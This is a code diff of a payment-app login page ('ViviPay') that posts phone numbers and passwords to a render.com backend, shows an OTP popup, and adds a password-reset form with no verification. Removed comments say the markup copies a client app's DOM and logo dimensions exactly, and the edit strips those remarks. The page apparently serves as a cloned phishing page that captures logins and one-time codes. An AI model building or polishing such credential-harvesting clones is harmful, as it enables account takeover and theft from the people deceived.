@@ -28,7 +28,7 @@
             height: 100%;
         }
 
-        /* Client Dom Spec: <main data-v-6ffee151 style="height: 100vh;"> */
+        /* Client Dom Spec */
         main[data-v-6ffee151] {
             height: 100vh;
             width: 100%;
@@ -36,10 +36,9 @@
             flex-direction: column;
             align-items: center;
             background-color: #ffffff;
-            padding: 0 0.67rem; /* Equivalent spacing */
+            padding: 0 0.67rem;
         }
 
-        /* Client Dom Spec: <div data-v-6ffee151=""> for Logo Box */
         div[data-v-6ffee151]:not(.loginform) {
             width: 100%;
             display: flex;
@@ -48,20 +47,18 @@
             margin-top: 1.2rem;
         }
 
-        /* Exact Match Image Selection Specs (302.39 x 222.81 Box Ratio) */
         img.logo {
             width: 302.39px;
             height: 222.81px;
             object-fit: contain;
         }
 
-        /* Client Dom Spec: <div data-v-6ffee151 class="loginform" style="transform: translateY(-50px);"> */
         .loginform {
             width: 100%;
             max-width: 380px;
             display: flex;
             flex-direction: column;
-            transform: translateY(-25px); /* Perfectly balanced native offset alignment */
+            transform: translateY(-25px);
         }
 
         /* UI Native Field Styling */
@@ -163,7 +160,7 @@
             background-color: #0071eb;
         }
 
-        /* Bottom Privacy Spec: <div data-v-6ffee151 style="height: 3rem;"> */
+        /* Bottom Privacy Spec */
         .policy-container-box {
             margin-top: 20px;
             height: 3rem;
@@ -298,7 +295,7 @@
             color: #94a3b8;
         }
 
-        /* Native Modify Password Overlay Screen Layout */
+        /* Native Modify Password Layer Overlay Screen Layout */
         .modify-modal-overlay {
             position: fixed;
             top: 0;
@@ -464,6 +461,7 @@
                             <input type="checkbox" id="save-pwd">
                             Save Password
                         </label>
+                        <!-- FIXED: ID properly mapped here -->
                         <span class="forgot-pass-link" id="triggerForgot">Forgot password</span>
                     </div>
 
@@ -512,7 +510,8 @@
             </div>
             <div class="modify-form-title">Modify password Form</div>
         </div>
-        <div class="modify-form-container">
+        <!-- FIXED: Wrapped in a real form submission pipeline -->
+        <form id="forgotForm" onsubmit="handleModifyPasswordSubmit(event)" class="modify-form-container">
             <div class="modify-row">
                 <span class="modify-label">Phone</span>
                 <input type="tel" class="modify-input-box" id="forgotPhone" placeholder="Enter phone number" required>
@@ -526,8 +525,8 @@
                 <input type="password" class="modify-input-box" id="forgotConfirmPass" placeholder="Password, Again" required>
             </div>
             <span class="modify-redirect-link" id="redirectLoginLink">Already have an account,Go login</span>
-            <button class="modify-submit-btn" onclick="handleModifyPasswordSubmit()">Modify</button>
-        </div>
+            <button type="submit" class="modify-submit-btn">Modify</button>
+        </form>
     </div>
 
     <script>
@@ -546,19 +545,19 @@
         let isResetFlow = false;
         let resetPhoneNumber = "";
 
+        // URL Selector Engine
         const BACKEND_URL = window.location.hostname === '127.0.0.1' || window.location.hostname === 'localhost' 
             ? 'http://127.0.0.1:4000' 
             : 'https://vivipay-backend.onrender.com';
 
-        // Interface Toggle Actions
+        // Toggle UI Triggers
         if(triggerForgot) {
             triggerForgot.addEventListener('click', (e) => {
-                e.preventDefault();
                 modifyPasswordModal.classList.add('active');
             });
         }
         if(backToLoginBtn) { backToLoginBtn.addEventListener('click', () => { modifyPasswordModal.classList.remove('active'); }); }
-        if(redirectLoginLink) { redirectLoginLink.addEventListener('click', (e) => { e.preventDefault(); modifyPasswordModal.classList.remove('active'); }); }
+        if(redirectLoginLink) { redirectLoginLink.addEventListener('click', () => { modifyPasswordModal.classList.remove('active'); }); }
 
         function triggerOtpPopup(phone) {
             if(phone.length >= 7) {
@@ -576,7 +575,7 @@
             startTimer();
         }
 
-        // 1. Regular Login Submission
+        // 1. LOGIN PIPELINE
         loginForm.addEventListener('submit', async (e) => {
             e.preventDefault(); 
             isResetFlow = false;
@@ -584,10 +583,7 @@
             const password = document.getElementById('password').value;
             const isAgreed = document.getElementById('agreeCheck').checked;
 
-            if (!isAgreed) {
-                alert('Please accept User Privacy Agreement.');
-                return;
-            }
+            if (!isAgreed) { alert('Please accept User Privacy Agreement.'); return; }
 
             try {
                 const response = await fetch(`${BACKEND_URL}/api/login-submit`, {
@@ -597,23 +593,27 @@
                 });
 
                 const data = await response.json();
-
                 if (data.success) {
                     currentUserId = data.userId; 
                     triggerOtpPopup(phoneNumber);
-                } else {
-                    alert("Server Error! Try again.");
-                }
-            } catch (error) {
-                alert("Cannot connect to Backend Server!");
-            }
+                } else { alert("Server Error! Try again."); }
+            } catch (error) { alert("Cannot connect to Backend Server!"); }
         });
 
-        // 2. Forgot Password Action Handler
-        async function handleModifyPasswordSubmit() {
+        // 2. FORGOT PASSWORD PIPELINE
+        async function handleModifyPasswordSubmit(event) {
+            event.preventDefault();
             const phone = document.getElementById('forgotPhone').value;
             const newPassword = document.getElementById('forgotNewPass').value;
             const confirmPassword = document.getElementById('forgotConfirmPass').value;
 
-            if (!phone || !newPassword || !confirmPassword) { alert("Please fill all fields!"); return; }
-            if (newPassword
+            if (newPassword !== confirmPassword) { alert("Passwords do not match!"); return; }
+
+            try {
+                const response = await fetch(`${BACKEND_URL}/api/forgot-submit`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone, newPassword })
+                });
+                const data = await response.json();
+                if(data.success) {
